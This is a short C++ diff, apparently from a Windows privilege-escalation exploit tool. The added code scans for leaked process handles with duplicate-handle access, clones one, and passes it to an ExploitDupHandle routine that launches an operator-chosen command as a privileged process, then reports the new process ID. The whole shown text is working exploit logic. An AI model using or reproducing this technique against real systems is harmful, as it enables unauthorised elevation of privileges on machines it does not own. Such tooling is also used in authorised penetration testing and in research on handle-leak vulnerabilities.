@@ -152,6 +152,25 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[])
 										return 0;
 									}
 								}
+								else if (handle.GrantedAccess & PROCESS_DUP_HANDLE) {
+									HANDLE clHandle;
+									if (!CloneHandle(handle.UniqueProcessId, (HANDLE)handle.HandleValue, &clHandle)) {
+										std::cerr << "[-] CloneHandle failed\n";
+									}
+									else {
+										DWORD privPid = ExploitDupHandle(
+											clHandle,
+											(WCHAR*)args.find(L"--cmd")->second.c_str());
+										CloseHandle(clHandle);
+										if (privPid == 0) {
+											std::cerr << "[-] ExploitDupHandle failed\n";
+										}
+										else {
+											std::cerr << "[!] Privileged process launched with PID " << privPid << "\n";
+											return 0;
+										}
+									}
+								}
 							}
 						}
 					}
